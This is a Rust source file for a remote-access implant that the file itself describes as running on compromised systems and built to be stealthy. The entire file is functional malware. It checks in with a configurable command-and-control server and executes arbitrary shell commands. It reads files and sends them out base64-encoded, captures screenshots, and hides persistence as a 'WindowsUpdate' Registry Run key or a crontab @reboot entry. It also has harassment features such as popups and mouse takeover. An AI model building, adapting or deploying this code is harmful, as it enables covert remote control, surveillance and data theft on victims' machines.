/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Implant binary - runs on compromised systems.
//!
//! This is a standalone executable that connects to the C2 server,
//! receives commands, and executes them. It's designed to be small
//! and stealthy.
//!
//! # Configuration
//!
//! Edit these constants before compiling for your target:

// === CONFIGURATION ===
// Set via environment variable when building:
//   REMY_C2_URL=http://your-server:8080 cargo build --release --bin remy-implant
// Or use: remy generate --c2 http://your-server:8080

/// C2 server URL - set via REMY_C2_URL env var at compile time
const C2_URL: &str = match option_env!("REMY_C2_URL") {
    Some(url) => url,
    None => "http://localhost:8080",
};

/// How often to check in with the C2 (seconds)
const SLEEP_INTERVAL: u64 = 30;

// === END CONFIGURATION ===

// Note: We include the necessary modules inline to keep the implant
// as a single, self-contained binary.

use chrono::Utc;
use hostname;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::env;
use std::process::Command as ProcessCommand;
use std::time::Duration;
use uuid::Uuid;

// Simplified protocol types (duplicated to keep implant standalone)

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ImplantInfo {
    id: String,
    hostname: String,
    os: String,
    username: String,
    ip: String,
    first_seen: chrono::DateTime<Utc>,
    last_seen: chrono::DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CheckinRequest {
    info: ImplantInfo,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CheckinResponse {
    commands: Vec<ServerCommand>,
    sleep_interval: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ServerCommand {
    id: String,
    implant_id: String,
    command: CommandType,
    created_at: chrono::DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "args")]
enum CommandType {
    Exec { cmd: String },
    Upload { remote_path: String, data: String },
    Download { remote_path: String },
    Screenshot,
    SysInfo,
    Persist,
    Uninstall,
    Rickroll,
    Wallpaper { image_url: String },
    Speak { message: String },
    Popup { message: String, count: u32 },
    MouseChaos { duration_secs: u32 },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CommandResult {
    command_id: String,
    implant_id: String,
    success: bool,
    output: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<String>,
    timestamp: chrono::DateTime<Utc>,
}

/// Main implant loop.
///
/// 1. Gather system info
/// 2. Check in with C2
/// 3. Execute any received commands
/// 4. Send results
/// 5. Sleep and repeat
#[tokio::main]
async fn main() {
    // Generate unique implant ID
    let implant_id = Uuid::new_v4().to_string();

    // Gather system information
    let info = gather_info(implant_id.clone());

    // Create HTTP client
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client");

    let mut sleep_interval = SLEEP_INTERVAL;

    // Main loop
    loop {
        // Check in with C2
        match checkin(&client, &info).await {
            Ok(response) => {
                // Update sleep interval if server says so
                sleep_interval = response.sleep_interval;

                // Execute each command
                for cmd in response.commands {
                    let result = execute_command(&cmd);

                    // Send result back
                    let _ = send_result(&client, result).await;
                }
            }
            Err(_) => {
                // Connection failed - just keep trying
            }
        }

        // Sleep before next check-in
        tokio::time::sleep(Duration::from_secs(sleep_interval)).await;
    }
}

/// Gathers information about the current system.
fn gather_info(id: String) -> ImplantInfo {
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_default();

    let os = format!("{} {}", env::consts::OS, env::consts::ARCH);

    let username = env::var("USER")
        .or_else(|_| env::var("USERNAME"))
        .unwrap_or_default();

    let now = Utc::now();

    ImplantInfo {
        id,
        hostname,
        os,
        username,
        ip: String::new(),
        first_seen: now,
        last_seen: now,
    }
}

/// Checks in with the C2 server.
async fn checkin(client: &Client, info: &ImplantInfo) -> Result<CheckinResponse, reqwest::Error> {
    let url = format!("{}/api/checkin", C2_URL);
    let request = CheckinRequest { info: info.clone() };

    client
        .post(&url)
        .json(&request)
        .send()
        .await?
        .json()
        .await
}

/// Sends a command result to the C2 server.
async fn send_result(client: &Client, result: CommandResult) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/result", C2_URL);
    client.post(&url).json(&result).send().await?;
    Ok(())
}

/// Executes a command and returns the result.
fn execute_command(cmd: &ServerCommand) -> CommandResult {
    let (success, output, data) = match &cmd.command {
        CommandType::Exec { cmd: shell_cmd } => {
            match execute_shell(shell_cmd) {
                Ok(out) => (true, out, None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Upload { remote_path, data } => {
            match upload_file(remote_path, data) {
                Ok(msg) => (true, msg, None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Download { remote_path } => {
            match download_file(remote_path) {
                Ok(b64_data) => (true, format!("Downloaded {} bytes", b64_data.len()), Some(b64_data)),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Screenshot => {
            match take_screenshot() {
                Ok(b64_data) => (true, "Screenshot captured".to_string(), Some(b64_data)),
                Err(e) => (false, e, None),
            }
        }

        CommandType::SysInfo => {
            let info = get_sysinfo();
            (true, info, None)
        }

        CommandType::Persist => {
            match install_persistence() {
                Ok(msg) => (true, msg, None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Uninstall => {
            let _ = remove_persistence();
            (true, "Uninstalling...".to_string(), None)
            // ponytail: actual exit happens after result is sent
        }

        CommandType::Rickroll => {
            match open::that("https://www.youtube.com/watch?v=dQw4w9WgXcQ") {
                Ok(_) => (true, "Never gonna give you up!".to_string(), None),
                Err(e) => (false, format!("Failed: {}", e), None),
            }
        }

        CommandType::Wallpaper { image_url } => {
            match set_wallpaper(image_url) {
                Ok(_) => (true, "Wallpaper changed".to_string(), None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Speak { message } => {
            match speak_message(message) {
                Ok(_) => (true, format!("Spoke: {}", message), None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Popup { message, count } => {
            show_popups(message, *count);
            (true, format!("Showed {} popups", count), None)
        }

        CommandType::MouseChaos { duration_secs } => {
            mouse_chaos(*duration_secs);
            (true, format!("Mouse chaos for {}s", duration_secs), None)
        }
    };

    CommandResult {
        command_id: cmd.id.clone(),
        implant_id: cmd.implant_id.clone(),
        success,
        output,
        data,
        timestamp: Utc::now(),
    }
}

/// Executes a shell command.
fn execute_shell(cmd: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        ProcessCommand::new("cmd").args(["/C", cmd]).output()
    } else {
        ProcessCommand::new("sh").args(["-c", cmd]).output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            Ok(format!("{}{}", stdout, stderr))
        }
        Err(e) => Err(format!("Failed: {}", e)),
    }
}

/// Speaks a message using TTS.
fn speak_message(message: &str) -> Result<(), String> {
    #[cfg(target_os = "linux")]
    {
        ProcessCommand::new("espeak")
            .arg(message)
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    #[cfg(target_os = "macos")]
    {
        ProcessCommand::new("say")
            .arg(message)
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    #[cfg(target_os = "windows")]
    {
        let script = format!(
            "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{}')",
            message.replace('\'', "''")
        );
        ProcessCommand::new("powershell")
            .args(["-Command", &script])
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    Ok(())
}

/// Shows popup message boxes.
fn show_popups(message: &str, count: u32) {
    for _ in 0..count {
        #[cfg(target_os = "linux")]
        {
            let _ = ProcessCommand::new("zenity")
                .args(["--info", "--text", message])
                .spawn();
        }

        #[cfg(target_os = "macos")]
        {
            let script = format!("display dialog \"{}\" buttons {{\"OK\"}}", message);
            let _ = ProcessCommand::new("osascript")
                .args(["-e", &script])
                .spawn();
        }

        #[cfg(target_os = "windows")]
        {
            let script = format!(
                "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('{}')",
                message.replace('\'', "''")
            );
            let _ = ProcessCommand::new("powershell")
                .args(["-Command", &script])
                .spawn();
        }

        std::thread::sleep(Duration::from_millis(300));
    }
}

/// Downloads (reads) a file and returns base64-encoded contents.
fn download_file(path: &str) -> Result<String, String> {
    use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
    let contents = std::fs::read(path).map_err(|e| format!("Read failed: {}", e))?;
    Ok(BASE64.encode(contents))
}

/// Uploads (writes) base64-encoded data to a file.
fn upload_file(path: &str, data: &str) -> Result<String, String> {
    use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
    let contents = BASE64.decode(data).map_err(|e| format!("Invalid base64: {}", e))?;
    let size = contents.len();
    std::fs::write(path, contents).map_err(|e| format!("Write failed: {}", e))?;
    Ok(format!("Uploaded {} bytes to {}", size, path))
}

/// Takes a screenshot and returns base64-encoded PNG.
fn take_screenshot() -> Result<String, String> {
    use base64::{engine::general_purpose::STANDARD as BASE64, Engine};

    #[cfg(feature = "screenshots")]
    {
        use screenshots::Screen;
        let screens = Screen::all().map_err(|e| format!("{}", e))?;
        if let Some(screen) = screens.first() {
            let image = screen.capture().map_err(|e| format!("{}", e))?;
            let buffer = image.to_png().map_err(|e| format!("{}", e))?;
            return Ok(BASE64.encode(buffer));
        }
        return Err("No screens found".to_string());
    }

    #[cfg(not(feature = "screenshots"))]
    {
        // Fallback: use system tools
        let temp_path = "/tmp/screenshot.png";

        #[cfg(target_os = "linux")]
        {
            let _ = ProcessCommand::new("scrot").arg(temp_path).output();
        }

        #[cfg(target_os = "macos")]
        {
            let _ = ProcessCommand::new("screencapture").arg(temp_path).output();
        }

        #[cfg(target_os = "windows")]
        {
            // Use PowerShell to take screenshot
            let script = format!(
                r#"Add-Type -AssemblyName System.Windows.Forms
$bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
$bitmap.Save("{}")
"#,
                temp_path.replace('/', "\\")
            );
            let _ = ProcessCommand::new("powershell").args(["-Command", &script]).output();
        }

        if std::path::Path::new(temp_path).exists() {
            let data = std::fs::read(temp_path).map_err(|e| format!("{}", e))?;
            let _ = std::fs::remove_file(temp_path);
            return Ok(BASE64.encode(data));
        }
        Err("Screenshot capture failed".to_string())
    }
}

/// Gets system information.
fn get_sysinfo() -> String {
    let mut info = String::new();

    info.push_str(&format!("OS: {} {}\n", env::consts::OS, env::consts::ARCH));
    info.push_str(&format!("Hostname: {}\n", hostname::get().map(|h| h.to_string_lossy().to_string()).unwrap_or_default()));
    info.push_str(&format!("User: {}\n", env::var("USER").or_else(|_| env::var("USERNAME")).unwrap_or_default()));

    if let Ok(cwd) = env::current_dir() {
        info.push_str(&format!("CWD: {}\n", cwd.display()));
    }

    // Try to get more info via system commands
    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = ProcessCommand::new("uname").arg("-a").output() {
            info.push_str(&format!("Kernel: {}\n", String::from_utf8_lossy(&output.stdout).trim()));
        }
        if let Ok(uptime) = std::fs::read_to_string("/proc/uptime") {
            if let Some(secs) = uptime.split_whitespace().next() {
                if let Ok(s) = secs.parse::<f64>() {
                    let hours = (s / 3600.0) as u64;
                    let mins = ((s % 3600.0) / 60.0) as u64;
                    info.push_str(&format!("Uptime: {}h {}m\n", hours, mins));
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = ProcessCommand::new("systeminfo").output() {
            // Just grab first few lines
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines().take(10) {
                info.push_str(line);
                info.push('\n');
            }
        }
    }

    info
}

/// Installs persistence mechanisms.
fn install_persistence() -> Result<String, String> {
    let exe_path = env::current_exe().map_err(|e| format!("{}", e))?;
    let exe_str = exe_path.to_string_lossy();

    #[cfg(target_os = "windows")]
    {
        // Registry Run key
        let _ = ProcessCommand::new("reg")
            .args([
                "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "WindowsUpdate",
                "/t", "REG_SZ",
                "/d", &exe_str,
                "/f",
            ])
            .output();
        return Ok("Persistence installed via Registry Run key".to_string());
    }

    #[cfg(not(target_os = "windows"))]
    {
        // crontab @reboot
        let result = ProcessCommand::new("bash")
            .args(["-c", &format!(
                "(crontab -l 2>/dev/null | grep -v '{}'; echo '@reboot {}') | crontab -",
                exe_str, exe_str
            )])
            .output();

        if result.map(|o| o.status.success()).unwrap_or(false) {
            return Ok("Persistence installed via crontab".to_string());
        }
        Err("Failed to install persistence".to_string())
    }
}

/// Removes persistence mechanisms.
fn remove_persistence() -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        let _ = ProcessCommand::new("reg")
            .args([
                "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "WindowsUpdate",
                "/f",
            ])
            .output();
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(exe) = env::current_exe() {
            let exe_str = exe.to_string_lossy();
            let _ = ProcessCommand::new("bash")
                .args(["-c", &format!("crontab -l 2>/dev/null | grep -v '{}' | crontab -", exe_str)])
                .output();
        }
    }

    Ok("Persistence removed".to_string())
}

/// Sets desktop wallpaper from URL.
fn set_wallpaper(image_url: &str) -> Result<(), String> {
    let temp_path = if cfg!(target_os = "windows") {
        format!("{}\\wallpaper.jpg", env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string()))
    } else {
        "/tmp/wallpaper.jpg".to_string()
    };

    // Download the image
    let output = ProcessCommand::new("curl")
        .args(["-sL", "-o", &temp_path, image_url])
        .output()
        .map_err(|e| format!("Download failed: {}", e))?;

    if !output.status.success() {
        return Err("Failed to download image".to_string());
    }

    #[cfg(target_os = "linux")]
    {
        // Try various desktop environments
        let _ = ProcessCommand::new("gsettings")
            .args(["set", "org.gnome.desktop.background", "picture-uri", &format!("file://{}", temp_path)])
            .output();
        let _ = ProcessCommand::new("feh")
            .args(["--bg-fill", &temp_path])
            .output();
    }

    #[cfg(target_os = "macos")]
    {
        let script = format!(
            r#"tell application "Finder" to set desktop picture to POSIX file "{}""#,
            temp_path
        );
        let _ = ProcessCommand::new("osascript").args(["-e", &script]).output();
    }

    #[cfg(target_os = "windows")]
    {
        let script = format!(
            r#"Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper {{ [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }}'; [Wallpaper]::SystemParametersInfo(20, 0, '{}', 3)"#,
            temp_path.replace('\\', "\\\\")
        );
        let _ = ProcessCommand::new("powershell").args(["-Command", &script]).output();
    }

    Ok(())
}

/// Makes the mouse cursor go crazy.
fn mouse_chaos(duration_secs: u32) {
    use std::thread;
    use std::time::Instant;

    let start = Instant::now();
    let duration = Duration::from_secs(duration_secs as u64);

    while start.elapsed() < duration {
        let x = (start.elapsed().as_millis() % 1920) as i32;
        let y = ((start.elapsed().as_millis() / 7) % 1080) as i32;

        #[cfg(target_os = "linux")]
        {
            let _ = ProcessCommand::new("xdotool")
                .args(["mousemove", &x.to_string(), &y.to_string()])
                .output();
        }

        #[cfg(target_os = "macos")]
        {
            let script = format!(
                r#"tell application "System Events" to set position of mouse to {{{}, {}}}"#,
                x, y
            );
            let _ = ProcessCommand::new("osascript").args(["-e", &script]).output();
        }

        #[cfg(target_os = "windows")]
        {
            let script = format!(
                r#"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point({}, {})"#,
                x, y
            );
            let _ = ProcessCommand::new("powershell").args(["-Command", &script]).output();
        }

        thread::sleep(Duration::from_millis(50));
    }
}
